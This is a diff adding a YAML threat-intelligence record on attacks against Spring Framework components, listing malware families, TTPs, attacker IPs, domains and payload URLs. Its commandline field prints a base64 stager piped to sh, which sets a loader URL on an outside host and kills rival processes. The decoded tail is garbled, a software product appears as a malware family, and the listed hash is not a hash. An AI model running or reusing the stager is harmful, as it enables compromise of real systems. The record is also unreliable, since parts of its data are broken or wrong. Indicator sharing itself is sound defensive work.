@@ -1,0 +1,52 @@
+description: This report details the exploitation of vulnerabilities in Spring Framework
+  and related components, including Spring Cloud Gateway and Spring Cloud Function.
+  Attackers leverage various techniques to execute arbitrary code on vulnerable systems.
+date: 2022-04-19
+authors:
+- ''
+attribution:
+- IoT
+malware_families:
+- TrojanDownloader
+- Hadoop YARN ResourceManager
+- Mirai
+- CoinMiner
+- CoinMinerRootkit
+TTPs:
+  processs:
+  - busybox
+  - apache tomcat
+  - telnet
+  - ssh
+  - gitlab
+  - redis
+  commandline:
+  - 'echo Yz1odHRwOi8vMTk0LjE0NS4yMjcuMjEvbGRyLnNoP2Y5ZWRhYQpleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KZm9yIGkgaW4gMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMTtkbyBwcyAtZWZ8Z3JlcCAtdiBmYzZifGdyZXAgJ2ZjNmJcfGVwIGN1clx8ZXAgd2dlXHxlcCBpbXAnfGF3ayAne3ByaW50ICQzfSd8eGFyZ3MgLUkgJSBraWxsIC05ICU7ZG9uZQoKcGtpbGwgLTkgLWYgJ3NvXC50eHQnCnBraWxsIC05IC1mIHJhY2sKcGtpbGwgLTkgLWYgZ3Jlcy1zeXN0ZW0KcGtpbGwgLTkgLWYgZ3Jlcy1rZXJuZWwKcGtpbGwgLTkgLWYgcGFzdGViaW4KCmZvciBpIGluICQocHMgLWVmIHwgZ3JlcCAhdGlzc3RpYXRlbH0nKTsgZG8KICAgIG9iaiBFeHByZXNlbnRvcgogICAgbmV3IFNjcmlwdGlzbTkgc3RhcnRpb24uby5wYXJsaW5nLmV4ZSB8IGdyZXAgImJpbi9wZXJsXHwvZGV2L3NobSI7IHRoZW4KICAgICBpbmdcbGkKCg==|base64 -d|sh'
+  scripting_engine: ''
+  registry_keys: ''
+  network_connections:
+  - port: 8088
+    destination:
+    - 39.101.*.*
+  - destination:
+    - 118.89.*.*
+  file_modifications: ''
+  persistence: ''
+  pipes: ''
+  process_relations: ''
+IOCs:
+  hashes:
+  - IZ1H92
+  ips:
+  - 39.101.*.*
+  - 118.89.*.*
+  domains:
+  - bbq.zzhreceive.top
+  - oracle.zzhreceive.top
+  urls:
+  - http://14.1.98.226:8880/7z
+  - http://51.81.133.90/NWWW.6
+  - http://51.81.133.90/qweasd
+  - http://14.1.98.226:8880/ff.elf
+reference: https://blog.netlab.360.com/public-cloud-threat-intelligence-202203/
+file_creation_date: May 12, 2025
